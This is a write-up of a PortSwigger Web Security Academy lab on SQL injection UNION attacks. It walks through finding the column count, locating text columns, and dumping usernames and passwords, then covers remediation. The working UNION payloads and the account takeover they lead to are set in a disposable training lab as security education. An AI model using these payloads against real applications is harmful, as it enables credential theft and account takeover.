# SQL Injection UNION Attack: Finding a Column Containing Text

- **Lab:** SQL injection UNION attack, finding a column containing text
- **Platform:** PortSwigger Web Security Academy
- **Category:** SQL Injection (OWASP A03:2021, Injection)
- **Difficulty:** Practitioner
- **URL:** https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

## Environment & Scope

Isolated training lab on PortSwigger's Web Security Academy. Each lab runs on a dedicated, disposable instance tied to my own account. No third-party or production systems were involved.

## Objective

A UNION attack can only display stolen data if the injected SELECT puts it in a column that both matches the type the original query expects and is actually rendered on the page. After the column count is known, the next step is to find which columns can carry text. This lab provides a random value and is solved when that value appears in the response.

## Reconnaissance

The product category filter loads `/filter?category=...` and places the value directly into the query, the same injection point as the other labs. One encoding detail mattered here: the category "Toys & Games" has to be sent as `Toys+%26+Games`. The `+` stands for a space and `%26` is the encoded `&`, because a raw `&` in a URL would start a new parameter and break the payload.

## Exploitation

### Step 1: determine the column count

Each lab is a fresh instance, so the count is measured again rather than assumed:

```
?category=Toys+%26+Games' UNION SELECT NULL--
?category=Toys+%26+Games' UNION SELECT NULL,NULL--
?category=Toys+%26+Games' UNION SELECT NULL,NULL,NULL--
```

One NULL errored, two NULLs returned the page, three NULLs errored again. The query returns 2 columns. The earlier column-count lab had 3, which confirms the count is per-target and has to be checked each time.

### Step 2: find the text column

With 2 columns, I placed the lab's provided value in each position in turn, NULL in the other:

```
?category=Toys+%26+Games' UNION SELECT 'value',NULL--
?category=Toys+%26+Games' UNION SELECT NULL,'value'--
```

Both placements returned without error and displayed the value, so both columns accept and render text. The value appearing in the response solved the lab.

### Step 3: turn the text column into data

Because both columns carry text, the same position can display real table data instead of a test string. The lab's `users` table holds `username` and `password`, so:

```
?category=Toys+%26+Games' UNION SELECT username, password FROM users--
```

returned every user's credentials alongside the product list. Example row:

```
administrator    k5kokpkh05rk54no6hm2
```

Using that password I logged in as `administrator`. The value is from a disposable lab instance and is already dead.

## Impact

A text-capable, visible column is the channel that turns a UNION injection into data exfiltration. Here it meant reading every account's username and password straight from the database and taking over the administrator account, with no password guessing and no second vulnerability required. In a real application the same column would expose any readable table: customer records, session tokens, internal data.

## Remediation

- **Parameterised queries (prepared statements).** Bound input cannot introduce a `UNION` or a comment, which removes the injection at its root.
- **Store passwords as salted hashes, never in plaintext.** Even if the table is read, hashed passwords are far less useful than the plaintext values exposed here.
- **Least privilege** for the application's database account, so an injected query cannot reach tables such as `users` that the product listing never needs.

## Key takeaway

Finding a column that is both type-compatible and displayed is the bridge between "I can inject a UNION" and "I can read anything". NULL finds how many columns there are, a test string finds which of them are text and visible, and from there real column names such as `username` and `password` simply replace the test string.
